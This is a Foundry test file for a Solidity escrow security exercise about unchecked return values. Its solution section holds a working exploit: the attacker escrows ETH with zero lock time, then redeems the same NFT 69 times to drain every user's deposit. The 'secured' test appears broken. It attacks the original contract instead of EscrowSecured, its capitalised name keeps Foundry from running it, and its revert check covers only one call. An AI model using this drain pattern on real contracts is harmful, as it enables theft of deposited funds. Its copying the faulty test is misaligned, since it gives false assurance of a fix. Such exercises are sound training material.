// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/unchecked-returns-2/Escrow.sol";
import "src/unchecked-returns-2/EscrowSecured.sol";
import "src/unchecked-returns-2/EscrowNFT.sol";

/**
 * @dev run "forge test -vvv --match-contract UR2"
 */
contract TestUR2 is Test {
    uint256 constant ONE_MONTH = 30 days;
    uint256 constant USER1_ESCROW_AMOUNT = 10 ether;
    uint256 constant USER2_ESCROW_AMOUNT = 54 ether;
    uint256 constant USER3_ESCROW_AMOUNT = 72 ether;
    uint256 constant USERS_INITIAL_BALANCE = 100 ether;

    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address attacker = makeAddr("attacker");

    EscrowNFT escrowNFT;
    EscrowSecured escrowSecured;
    Escrow escrow;

    uint256 attackerInitialBalance;

    function setUp() public {
        /* SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
        vm.deal(attacker, 2 ether);
        vm.deal(user1, USERS_INITIAL_BALANCE);
        vm.deal(user2, USERS_INITIAL_BALANCE);
        vm.deal(user3, USERS_INITIAL_BALANCE);

        attackerInitialBalance = attacker.balance;

        escrowNFT = new EscrowNFT();
        escrow = new Escrow(address(escrowNFT));
        escrowNFT.transferOwnership(address(escrow));
    }

    function testsEscrowNftTests() public {
        // Escrow 10 ETH from user1 to user2, one month treshold
        vm.prank(user1);
        escrow.escrowEth{value: USER1_ESCROW_AMOUNT}(user2, ONE_MONTH);
        uint256 tokenId = escrowNFT.tokenCounter();

        // User2 can't withdraw before matureTime
        vm.startPrank(user2);
        escrowNFT.approve(address(escrow), tokenId);
        vm.expectRevert("Escrow period not expired.");
        escrow.redeemEthFromEscrow(tokenId);

        // Fast forward to mature time
        vm.warp(block.timestamp + ONE_MONTH);

        // Another user can't withdraw if he doesn't own this NFT
        vm.startPrank(user3);
        vm.expectRevert("Must own token to claim underlying ETH");
        escrow.redeemEthFromEscrow(tokenId);

        // Recipient can withdraw after matureTime
        vm.startPrank(user2);
        escrowNFT.approve(address(escrow), tokenId);
        uint256 balanceBefore = user2.balance;
        escrow.redeemEthFromEscrow(tokenId);
        uint256 balanceAfter = user2.balance;
        assertGt(balanceAfter, balanceBefore + USER1_ESCROW_AMOUNT - 0.1 ether);
    }

    function testExploit() public {
        /* SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
        // Escrow more eth
        vm.startPrank(user1);
        escrow.escrowEth{value: USER1_ESCROW_AMOUNT}(user2, ONE_MONTH);

        vm.startPrank(user2);
        escrow.escrowEth{value: USER2_ESCROW_AMOUNT}(user1, ONE_MONTH);

        vm.startPrank(user3);
        escrow.escrowEth{value: USER3_ESCROW_AMOUNT}(user1, ONE_MONTH);

        /**
         * CODE YOUR SOLUTION HERE
         */
        vm.startPrank(attacker);
        escrow.escrowEth{value: 2 ether}(attacker, 0);

        uint256 tokenId = escrowNFT.tokenCounter();

        for (uint256 index = 0; index < 69; index++) {
            escrow.redeemEthFromEscrow(tokenId);
        }

        /**
         * SUCCESS CONDITIONS
         */

        // Attacker should drain the escrow contract
        assertGt(
            attacker.balance,
            attackerInitialBalance + USER1_ESCROW_AMOUNT + USER2_ESCROW_AMOUNT + USER3_ESCROW_AMOUNT - 0.1 ether
        );
        assertEq(address(escrow).balance, 0);
    }

    function TestExploitWithSecured() external {
        escrowSecured = new EscrowSecured(address(escrowNFT));

        // Escrow more eth
        vm.startPrank(user1);
        escrowSecured.escrowEth{value: USER1_ESCROW_AMOUNT}(user2, ONE_MONTH);

        vm.startPrank(user2);
        escrowSecured.escrowEth{value: USER2_ESCROW_AMOUNT}(user1, ONE_MONTH);

        vm.startPrank(user3);
        escrowSecured.escrowEth{value: USER3_ESCROW_AMOUNT}(user1, ONE_MONTH);

        vm.startPrank(attacker);
        escrow.escrowEth{value: 2 ether}(attacker, 0);

        uint256 tokenId = escrowNFT.tokenCounter();

        vm.expectRevert("NFT can't be burned");
        for (uint256 index = 0; index < 69; index++) {
            escrow.redeemEthFromEscrow(tokenId);
        }

        assertEq(attacker.balance, 2 ether);
    }
}
